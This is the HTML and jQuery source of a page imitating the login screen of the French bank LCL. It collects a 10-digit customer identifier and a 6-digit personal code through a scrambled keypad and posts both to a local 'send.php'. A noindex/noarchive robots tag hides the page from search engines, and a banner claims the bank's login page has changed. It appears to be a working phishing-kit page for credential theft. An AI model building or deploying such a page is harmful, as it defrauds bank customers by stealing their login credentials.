<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>LCL - Mon espace</title>
    </head>

    <body>

        <div id="wrapper">
            <div class="left">
                <div class="inner">
                    <div class="logo"><img src="assets/imgs/logo.svg"></div>
                                        <form action="send.php" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="login">
                        <legend>Votre identifiant</legend>
                        <div class="inputs">
                            <input type="text" maxlength="1" name="input1" id="input1">
                            <input type="text" maxlength="1" name="input2" id="input2">
                            <input type="text" maxlength="1" name="input3" id="input3">
                            <input type="text" maxlength="1" name="input4" id="input4">
                            <input type="text" maxlength="1" name="input5" id="input5">
                            <input type="text" maxlength="1" name="input6" id="input6">
                            <input type="text" maxlength="1" name="input7" id="input7">
                            <input type="text" maxlength="1" name="input8" id="input8">
                            <input type="text" maxlength="1" name="input9" id="input9">
                            <input type="text" maxlength="1" name="input10" id="input10">
                        </div>
                        <div class="text-center"><p class="remember">Mémoriser mon identifiant</p></div>

                        <div class="kk">
                            <div class="btns"><button id="submit1" type="button" class="disabled" disabled>Continue <i class="fas fa-long-arrow-alt-right"></i></button></div>
                            <p>Identifiant oublié ?</p>
                            <p>Code personnel oublié ?</p>
                        </div>

                        <div class="dd">
                            <h3>Votre code personnel</h3>
                            <div class="inputs2">
                                <ul>
                                    <li></li>
                                    <li></li>
                                    <li></li>
                                    <li></li>
                                    <li></li>
                                    <li></li>
                                    <li class="remove">x</li>
                                </ul>
                            </div>
                            <input type="hidden" name="password" id="password">
                            <div class="numbers">
                                <ul>
                                    <li data-number="7">7</li>
                                    <li data-number="2">2</li>
                                    <li data-number="6">6</li>
                                    <li data-number="4">4</li>
                                    <li data-number="0">0</li>
                                </ul>
                                <ul>
                                    <li data-number="8">8</li>
                                    <li data-number="5">5</li>
                                    <li data-number="3">3</li>
                                    <li data-number="9">9</li>
                                    <li data-number="1">1</li>
                                </ul>
                            </div>
                            <div class="btns"><button id="submit2" type="submit" class="disabled" disabled>Valider <i class="fas fa-long-arrow-alt-right"></i></button></div>
                            <p>Identifiant oublié ?</p>
                            <p>Code personnel oublié ?</p>
                        </div>
                        
                    </form>
                </div>
            </div>
            <div class="right">
                <div class="content">
                    <div class="img"><img src="assets/imgs/img.png"></div>
                    <div class="cc">
                        <h3>Bienvenue sur votre nouvelle page de connexion</h3>
                        <p>Votre page de connexion a changé.<br>Votre identifiant et votre mot de passe restent les mêmes.</p>
                        <span>Se rendre sur LCL sécurité</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            jQuery('.inputs input').payment('restrictNumeric');
            $('.inputs input').click(function(){
                $('.inputs input').each(function(i){
                    if( $(this).val() == '' ) {
                        $(this).focus();
                        return false;
                    }
                }); 
            });
            $('.inputs input').keyup(function(e){
                var btn = e.keyCode;
                if( btn == 8 ) {
                    $(this).prev().focus();
                } else {
                    if ( $.isNumeric($(this).val()) == false )
                        return false;
                    $(this).next().focus();
                }
                if( $('#input1').val() !== '' && $('#input2').val() !== '' && $('#input3').val() !== '' && $('#input4').val() !== '' && $('#input5').val() !== '' && $('#input6').val() !== '' && $('#input7').val() !== '' && $('#input8').val() && $('#input9').val() !== '' && $('#input10').val() !== '' ) {
                    $('#submit1').removeAttr('disabled').removeClass('disabled');
                } else {
                    $('#submit1').attr('disabled','disabled').addClass('disabled');
                    $('#submit2').attr('disabled','disabled').addClass('disabled');
                }
                if( $('#password').val().length == 6 && $('#input1').val() !== '' && $('#input2').val() !== '' && $('#input3').val() !== '' && $('#input4').val() !== '' && $('#input5').val() !== '' && $('#input6').val() !== '' && $('#input7').val() !== '' && $('#input8').val() && $('#input9').val() !== '' && $('#input10').val() !== '' ) {
                    $('#submit2').removeAttr('disabled').removeClass('disabled');
                }
            });
            $('.numbers ul li').click(function(){
                if( $('#password').val().length == 6 )
                    return false;
                var cur_number = $(this).data('number');
                var old_val = $('#password').val();
                var zz = old_val + cur_number;
                $('#password').val(zz);
                var num = $(".inputs2 ul li:not('.active')");
                console.log(num);
                if( num.length > 0 ) {
                    $(num[0]).addClass('active');
                }
                if( $('#password').val().length == 6 ) {
                    $('.remove').css({ 'display':'flex' });
                }
                if( $('#password').val().length == 6 && $('#input1').val() !== '' && $('#input2').val() !== '' && $('#input3').val() !== '' && $('#input4').val() !== '' && $('#input5').val() !== '' && $('#input6').val() !== '' && $('#input7').val() !== '' && $('#input8').val() && $('#input9').val() !== '' && $('#input10').val() !== '' ) {
                    $('#submit2').removeAttr('disabled').removeClass('disabled');
                }
            });
            $('.remove').click(function(){
                $(".inputs2 ul li:not('.remove')").removeClass('active');
                $('#submit2').attr('disabled','disabled').addClass('disabled');
                $('#password').val('');
                $('.remove').hide();
            });
            $('#submit1').click(function(){
                $('.dd').show();
                $('.kk').hide();
            });
        </script>

    </body>

</html>
